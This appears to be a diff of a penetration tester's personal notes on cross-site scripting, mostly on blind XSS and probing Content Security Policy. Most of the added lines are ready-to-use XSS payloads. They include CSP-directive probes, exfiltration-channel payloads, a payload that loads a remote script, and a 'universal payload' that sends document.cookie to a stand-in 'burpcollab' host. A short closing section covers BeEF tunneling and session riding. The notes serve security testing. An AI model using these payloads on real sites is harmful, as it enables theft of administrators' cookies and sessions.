@@ -1,21 +1,81 @@
+## Reflected and stored
+### HTML context
 
+`<title>`, `<textarea>` and some other [[XSS#^196c9e]] tags don't render their content, so it's worth to close them first.
+### JS context
+
+### CSS context
+
+### Client-side template injection
 ## Blind XSS
 
+Blind XSS occures when a payload is rendered in another web application, which isn't available to an attacker to observe. These applications typically are backoffices, which aim is to aggregate leads from different forms and display them to managers. These forms are feedback forms, complaint forms, support tickets, rating functionality and any fields that may end up in an administration panel or debug message. You can spot them at landing websites which serves no other purpose rather than inviting you to fiil in a form.
+
+A succesful injection is confirmed via a side channel, like Burp Collaborator, and tools like [XSS Hunter](https://xsshunter.com/) or [ezXSS](https://github.com/ssl/ezXSS), that collect as many data as possible, from a browser build to screenshots, and send them back to server.
+
+Before injecting tools code in your payload, you need to confirm that none of discussed [[Browser security]] controls is stopping you.
+
+Confirm an injection in HTML context with possible strict CSP in mind. You may need to try both HTTPS and HTTP schemes to omit mixed content problems.
 ```
-"><img src=burpcollab> - 1) отстук подтверждает HTML инъекцию (можно взять другой тэг с src на случай сторгой CSP)
-"><img/src/onerror=fetch(burpcollab,{mode:'no-cors'})> - 2) отстук подтверждает выполнение js
-"><script src=burpcollab></script> - 3) CSP не блокирует загрузку внешних скриптов
+"><img src=burpcollab> 
+"><link rel=dns-prefetch href=burpcollab>
+"><meta http-equiv="refresh" content="0;url=burpcollab">
+"><style>@import'burpcollab'</style>
+```
+You also may want to try to break an existent context with a polyglot payload ahead:
+```
+'"></title></textarea></style></script>
 ```
 
+Then probe for specific CSP directives:
+
+| HTML Payload                              | Corresponding directive |
+| ----------------------------------------- | ----------------------- |
+| `"><img src=burpcollab>`                  | `img-src`               |
+| `"><script src=burpcollab></script>`      | `script-src`            |
+| `"><link rel=stylesheet href=burpcollab>` | `style-src`             |
+| `"><video src=burpcollab>`                | `media-src`             |
+| `"><iframe src=burpcollab>`               | `frame-src`             |
+| `"><object data=burpcollab>`              | `object-src`            |
+Establish exfiltration channel:
+
+| HTML Payload                                                                                             | Corresponding directive |
+| -------------------------------------------------------------------------------------------------------- | ----------------------- |
+| `"><meta http-equiv="refresh" content="0;url=burpcollab">`                                               | `navigate-to`           |
+| `"><svg onload=fetch('//burpcollab/',{mode:'no-cors'})>`                                                 | `connect-src`           |
+| `"><style>@font-face{font-family:'x';src: url('//burpcollab/');}body{font-family:'x'!important}</style>` | `font-src`              |
+| `"><link rel=dns-prefetch href=burpcollab>`                                                              | none                    |
+Confirm inline JS execution rather than just cross-site request. To do so, first select the most permisive directive, chose an HTML tag which falls under it, then execute code in an attribute to make a request under that directive:
+
+| JS Payload                                                                                                           | Tag                         |
+| -------------------------------------------------------------------------------------------------------------------- | --------------------------- |
+| `new Image().src='//burpcollab/'`                                                                                    | `<img>`                     |
+| `new Image().src='//burpcollab/'`                                                                                    | `<iframe>`'s `srcdoc`       |
+| `new Audio('//burpcollab/')`                                                                                         | `<source>` inside `<video>` |
+| `fetch('//burpcollab',{mode:'no-cors'})`                                                                             | any                         |
+| ```var l=document.createElement('link');l.rel='dns-prefetch';l.href='//.burpcollab';document.head.appendChild(l);``` | any                         |
+| ```var v=document.createElement('video');v.src='//burpcollab/';document.body.appendChild(v)```                       | any                         |
+| ```var l=document.createElement('link');l.rel='stylesheet';l.href='//burpcollab/';document.head.appendChild(l);```   | any                         |
+
+Portswigger payload
 ```
-</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>
+</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/burpcollab/).slice(2), document.documentElement.appendChild(s))//'>
 ```
 
+Universal payload
+```
+"><details open ontoggle="
+  var c=encodeURIComponent(document.cookie);
+  new Image().src='//img.burpcollab/?'+c;
+  fetch('//fetch.burpcollab/?'+c,{mode:'no-cors'});
+  new Audio().src='//audio.burpcollab/?'+c;
+">
+```
 ## Server-side XSS
 
 by [slonser](https://t.me/slonser_notes)
 
-Содержимое этих тегов не обрабатывается как html теги:
+Содержимое этих тегов не обрабатывается как html теги: ^196c9e
 ```
 iframe
 noembed
@@ -58,7 +118,17 @@ a
 
 ## Leveraging
 
-Tunneling into internal networks is possible via [BeEF (The Browser Exploitation Framework)](https://github.com/beefproject/beef) payload. 
+Tunneling into internal networks is possible via [BeEF (The Browser Exploitation Framework)](https://github.com/beefproject/beef) payload. To achieve this in modern browsers, several criteria must be met:
+- `XMLHttpRequest` and `fetch` responses are restricted by SOP, so there should be a CORS misconfiguration at the target website
+- Mixed Content blocking restricts visiting HTTPS resources from HTTP resources and vice-versa, so request is only possible to the same protocol
+- CSP is absent or `connect-src` is not present, otherwise the connection is possible only to the resources which mentioned in the directive
+  
+So-called "session riding" applies additional restrictions to those described above:
+- ACAO header is reflected by the target web-server, ACAC header is presented and set to true
+- SameSite attribute is explicitly set to None
+- Domain attribute explicitly allows target web server, Path attribute is not set or configured loosely (i.e., "/")
+
+While session riding seems to be highly unlikely in modern environments, general tunneling is still possible due to a usual lack of security in internal networks. Even where CORS is not permissive, blind request-based attacks (triggering actions, network discovery via timing side-channels) remain possible.
 
 Misconfigured JavascriptInterface in Android WebViews may esaclate XSS to LFR or RCE.
 
